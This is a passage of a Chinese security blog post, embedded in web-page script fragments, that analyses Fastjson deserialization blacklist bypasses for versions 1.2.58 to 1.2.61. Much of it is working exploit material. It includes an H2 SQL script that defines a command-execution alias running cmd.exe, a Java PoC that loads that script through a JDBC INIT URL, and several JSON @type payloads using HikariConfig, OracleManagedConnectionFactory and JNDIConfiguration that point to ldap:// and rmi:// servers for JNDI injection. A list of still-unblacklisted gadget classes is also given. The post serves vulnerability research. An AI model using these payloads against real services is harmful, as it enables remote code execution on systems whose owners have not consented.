alt="image" loading="lazy">​</p><p>对比 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>​ 中的 <code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader(), false)</code>​ 函数，多了一个 cache 参数，cache 为 false 没有存入 map 中。这样由于 <code>clazz == null</code>​ 所以不会直接 return。</p><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><p>​<img src="'+T+'" alt="image" loading="lazy">​</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>继续往下执行判断，会命中黑名单抛出异常而终止。</p><p>​<img src="'+J+'" alt="image" loading="lazy">​</p><h2 id="_1-2-58-bypass" tabindex="-1"><a class="header-anchor" href="#_1-2-58-bypass"><span>1.2.58 Bypass</span></a></h2><p><strong>【依赖】</strong></p><p>需要开启 <code>AutoTypeSupport</code>​。</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>fastjson autoType is enabled\nh2 database and some jar\n.\n├── fastjson-1.2.58.jar\n├── h2-1.4.199.jar\n├── jackson-annotations-2.9.8.jar\n├── jackson-core-2.9.8.jar\n├── jackson-databind-2.9.8.jar\n└── logback-core-1.3.0-alpha4.jar\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【inject.sql】</strong></p><div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> ALIAS SHELLEXEC <span class="token keyword">AS</span> $$\nString shellexec<span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> throws java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException {\n    String<span class="token punctuation">[</span><span class="token punctuation">]</span> command <span class="token operator">=</span> {<span class="token string">&quot;cmd.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;/c&quot;</span><span class="token punctuation">,</span> cmd}<span class="token punctuation">;</span>\n    java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner s <span class="token operator">=</span> new java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>useDelimiter<span class="token punctuation">(</span><span class="token string">&quot;\\\\A&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">return</span> s<span class="token punctuation">.</span>hasNext<span class="token punctuation">(</span><span class="token punctuation">)</span> ? s<span class="token punctuation">.</span><span class="token keyword">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> : <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>\n}\n$$<span class="token punctuation">;</span>\n<span class="token keyword">CALL</span> SHELLEXEC<span class="token punctuation">(</span><span class="token string">&#39;calc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【payload】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>\n\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\\&quot;, \\&quot;url\\&quot;:\\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;\\&quot;}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token comment">//JSON.parse(payload); // 不会触发</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+I+'" alt="image" loading="lazy">​</p><h2 id="fastjson-1-2-61" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-61"><span>Fastjson &lt;= 1.2.61</span></a></h2><p>都是直接绕的黑名单。</p><h3 id="需要开启-autotypesupport" tabindex="-1"><a class="header-anchor" href="#需要开启-autotypesupport"><span><strong>需要开启 AutoTypeSupport</strong></span></a></h3><p><strong>【1.2.5 &lt;= 1.2.59】</strong></p><p>需要 <code>com.zaxxer.HikariCP</code>​ 依赖</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token comment">&lt;!-- 最快的数据源连接池--&gt;</span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.zaxxer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>HikariCP<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.4.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;metricRegistry&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n\n<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;healthCheckRegistry&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;com.zaxxer.hikari.HikariConfig\\&quot;,\\&quot;metricRegistry\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;}&quot;</span><span class="token punctuation">;</span>\n        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+L+'" alt="image" loading="lazy">​</p><p>也是 JDNI 注入利用链 ：</p><ul><li><code>com.zaxxer.hikari.HikariConfig#setHealthCheckRegistry</code>​</li><li>​<code>com.zaxxer.hikari.HikariConfig#setMetricRegistry</code>​</li></ul><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p>​<img src="'+O+'" alt="image" loading="lazy">​</p><hr><p>【<strong>1.2.5 &lt;= 1.2.60 CVE-2019-14540】</strong></p><p>上面的利用链在 1.2.59 被加入了黑名单，<code>autoType is not support. com.zaxxer.hikari.HikariConfig</code>​。</p>',134),V={href:"https://download.oracle.com/otn-pub/otn_software/jdbc/233/ojdbc8.jar",target:"_blank",rel:"noopener noreferrer"},G=(0,t.Fv)('<p>​<img src="'+D+'" alt="image" loading="lazy">​</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;xaDataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n\n<span class="token comment">// 注意这个 payload 只对 parseObject 生效，对 parse 不起作用</span>\n<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;prefix&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',2),$={href:"https://mvnrepository.com/artifact/commons-configuration/commons-configuration",target:"_blank",rel:"noopener noreferrer"},X=(0,t.Fv)('<div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-configuration<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-configuration<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.60<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+R+'" alt="image" loading="lazy">​</p><p>使用 parse 的时候不会调用 <code>org.apache.commons.configuration.JNDIConfiguration#getBaseContext</code>​，导致没法触发 JNDI 注入利用链。还尝试了一下以下的 payload，但是没有任何会调用的理由。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 哈哈就是随便试试，程序逻辑不是玄学</span>\n<span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;org.apache.commons.configuration.JNDIConfiguration\\&quot;,\\&quot;prefix\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;, \\&quot;baseContext\\&quot;:\\&quot; \\&quot;}&quot;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+P+'" alt="image" loading="lazy">​</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p>',6),Y={href:"https://github.com/jas502n/fastjson-1.2.60-rce",target:"_blank",rel:"noopener noreferrer"},Q=(0,t.Fv)('<div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token number">1.</span> 经过测试，命中的 <span class="token number">4</span> 个文件都是可以利用的。\n\n<span class="token number">2.</span> 不过其中 <span class="token class-name">HikariConfig</span> 类就是前文提到的类，在 <span class="token number">1.2</span><span class="token number">.60</span> 版本被加入黑名单，<span class="token class-name">JNDIConnectionPool</span> 类在 <span class="token number">42</span> 版本前就被加入黑名单了。\n\n<span class="token number">3.</span> 另外的两个类 <span class="token class-name">JNDIConfiguration</span> 和 <span class="token class-name">OracleManagedConnectionFactory</span> 都可以构造出攻击 poc，且尚未被加入黑名单。\n\n<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>\nsource<span class="token operator">/</span>commons<span class="token operator">-</span>configuration<span class="token operator">-</span><span class="token number">1.9</span><span class="token operator">/</span>org<span class="token operator">/</span>apache<span class="token operator">/</span>commons<span class="token operator">/</span>configuration<span class="token operator">/</span><span class="token class-name">JNDIConfiguration</span><span class="token punctuation">.</span>java containsKey\n\nsource<span class="token operator">/</span>commons<span class="token operator">-</span>configuration<span class="token operator">-</span><span class="token number">1.9</span><span class="token operator">/</span>org<span class="token operator">/</span>apache<span class="token operator">/</span>commons<span class="token operator">/</span>configuration<span class="token operator">/</span><span class="token class-name">JNDIConfiguration</span><span class="token punctuation">.</span>java getProperty\n\nsource<span class="token operator">/</span><span class="token class-name">HikariCP</span><span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.1</span><span class="token operator">/</span>com<span class="token operator">/</span>zaxxer<span class="token operator">/</span>hikari<span class="token operator">/</span><span class="token class-name">HikariConfig</span><span class="token punctuation">.</span>java getObjectOrPerformJndiLookup\n\nsource<span class="token operator">/</span>ojdbc14<span class="token operator">-</span><span class="token number">10.2</span><span class="token number">.0</span><span class="token number">.2</span><span class="token operator">/</span>oracle<span class="token operator">/</span>jdbc<span class="token operator">/</span>connector<span class="token operator">/</span><span class="token class-name">OracleManagedConnectionFactory</span><span class="token punctuation">.</span>java setupXADataSource\n\nsource<span class="token operator">/</span>xalan<span class="token operator">-</span><span class="token number">2.7</span><span class="token number">.2</span><span class="token operator">/</span>org<span class="token operator">/</span>apache<span class="token operator">/</span>xalan<span class="token operator">/</span>lib<span class="token operator">/</span>sql<span class="token operator">/</span><span class="token class-name">JNDIConnectionPool</span><span class="token punctuation">.</span>java findDatasource\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><strong>【1.2.5 &lt;= 1.2.61】</strong></p>',3),Z={href:"https://github.com/jas502n/fastjson-1.2.61-RCE",target:"_blank",rel:"noopener noreferrer"},nn={href:"https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java",target:"_blank",rel:"noopener noreferrer"},sn=(0,t.Lk)("code",null,"0x7bddd363ad3998c6L",-1),an=(0,t.Lk)("code",null,"org.apache.commons.configuration.JNDIConfiguration",-1),tn=(0,t.Lk)("p",null,[(0,t.Lk)("mark",null,"但是未将"),(0,t.eW)(),(0,t.Lk)("mark",null,[(0,t.eW)("​"),(0,t.Lk)("code",null,"org.apache.commons.configuration2.JNDIConfiguration"),(0,t.eW)("​")]),(0,t.eW)("​ "),(0,t.Lk)("mark",null,"加入黑名单，导致 1.2.61 bypass。")],-1),pn={href:"https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2",target:"_blank",rel:"noopener noreferrer"},on=(0,t.Fv)('<div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-configuration2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.10.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.61<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+M+'" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJsonTest</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> jsonStr1 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;org.apache.commons.configuration2.JNDIConfiguration\\&quot;,\\&quot;prefix\\&quot;:\\&quot;ldap://localhost:1389/ExportObject\\&quot;}&quot;</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> jsonStr2 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;org.apache.commons.configuration2.JNDIConfiguration\\&quot;,\\&quot;prefix\\&quot;:\\&quot;rmi://localhost:1099/ExportObject\\&quot;}&quot;</span><span class="token punctuation">;</span>\n\n        <span class="token class-name">JSONObject</span> json <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr2<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token comment">//json.toJSONString();</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">//        fastjson 1.2.60</span>\n<span class="token comment">//        String jsonStr2 = &quot;{\\&quot;@type\\&quot;:\\&quot;org.apache.commons.configuration.JNDIConfiguration\\&quot;,\\&quot;prefix\\&quot;:\\&quot;ldap://10.10.20.166:1389/ExportObject\\&quot;}&quot;;</span>\n\n<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> payload\n<span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;prefix&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h3 id="无需开启-autotypesupport【失败】" tabindex="-1"><a class="header-anchor" href="#无需开启-autotypesupport【失败】"><span><s>无需开启</s> <strong><s>AutoTypeSupport【失败】</s></strong></span></a></h3><p><strong><s>【1.2.5 &lt;= 1.2.61】失败</s></strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-proxy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token comment">// 失败的 poc</span>\n<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;jndiName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>经过测试这个类的确不在黑名单之中，但是 <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>​ 的时候会触发下面这个异常，没法返回 loadClass 返回的 clazz。</p><p>​<img src="'+_+'" alt="image" loading="lazy">​</p><p>​<img src="'+W+'" alt="image" loading="lazy">​</p><p>​<img src="'+U+'" alt="image" loading="lazy">​</p><p><strong>【原因】</strong> ：<code>org.apache.commons.proxy.provider.remoting.SessionBeanProvider</code>​ 没有无参构造函数，Fastjson 